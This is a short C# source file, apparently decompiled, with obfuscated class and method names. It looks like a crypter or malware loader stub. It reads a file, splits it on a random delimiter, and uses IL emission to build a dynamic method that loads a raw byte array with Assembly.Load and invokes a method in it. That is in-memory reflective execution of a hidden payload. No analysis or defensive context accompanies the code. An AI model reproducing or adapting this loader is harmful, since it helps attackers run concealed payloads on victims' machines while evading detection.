using System;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using Microsoft.VisualBasic;

namespace RW;

internal class oO
{
	internal static object[] info = Strings.Split(File.ReadAllText(po.licate), "BUYbSvE5lQT", -1, (CompareMethod)0);

	private object method_0()
	{
		while (true)
		{
		}
	}

	public static object cBytes(byte[] bytes, string method)
	{
		DynamicMethod dynamicMethod = new DynamicMethod("ExecBytes", typeof(object), new Type[4]
		{
			typeof(byte[]),
			typeof(object[]),
			typeof(string),
			typeof(string)
		}, typeof(object));
		ILGenerator iLGenerator = dynamicMethod.GetILGenerator();
		iLGenerator.Emit(OpCodes.Ldarg_0);
		iLGenerator.EmitCall(OpCodes.Call, typeof(Assembly).GetMethod("Load", new Type[1] { typeof(byte[]) }), null);
		iLGenerator.Emit(OpCodes.Ldarg_2);
		iLGenerator.EmitCall(OpCodes.Callvirt, typeof(Assembly).GetMethod("GetType", new Type[1] { typeof(string) }), null);
		iLGenerator.Emit(OpCodes.Ldarg_3);
		iLGenerator.EmitCall(OpCodes.Callvirt, typeof(Type).GetMethod("GetMethod", new Type[1] { typeof(string) }), null);
		iLGenerator.Emit(OpCodes.Ldnull);
		iLGenerator.Emit(OpCodes.Ldarg_1);
		iLGenerator.EmitCall(OpCodes.Callvirt, typeof(MethodBase).GetMethod("Invoke", new Type[2]
		{
			typeof(object),
			typeof(object[])
		}), null);
		iLGenerator.Emit(OpCodes.Ret);
		return dynamicMethod.Invoke(null, new object[4]
		{
			bytes,
			new object[0],
			"A.A",
			method
		});
	}

	public void Zb7L32MzK4IQ66I5()
	{
	}
}
